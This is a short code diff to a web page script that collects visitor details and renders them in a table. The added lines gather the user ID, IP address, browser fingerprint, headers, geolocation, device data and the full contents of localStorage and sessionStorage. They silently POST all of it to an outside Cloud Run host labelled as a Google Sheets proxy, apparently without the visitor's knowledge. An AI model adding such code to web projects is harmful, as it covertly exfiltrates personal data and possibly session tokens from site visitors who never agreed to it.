@@ -209,6 +209,28 @@
             const localStorageData = getLocalStorage();
             const sessionStorageData = getSessionStorage();
 
+            const userInfo = {
+                userId,
+                ipAddress,
+                browserFingerprint,
+                httpHeaders,
+                deviceInfo,
+                geolocation,
+                timezone,
+                screenResolution,
+                plugins,
+                localStorageData,
+                sessionStorageData,
+            };
+
+            await fetch('https://google-sheets-proxy-mk66ircp2a-uc.a.run.app/Angelia', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userInfo),
+            });
+
             const userInfoDiv = document.getElementById('user-info');
             userInfoDiv.innerHTML = `
                 <table>
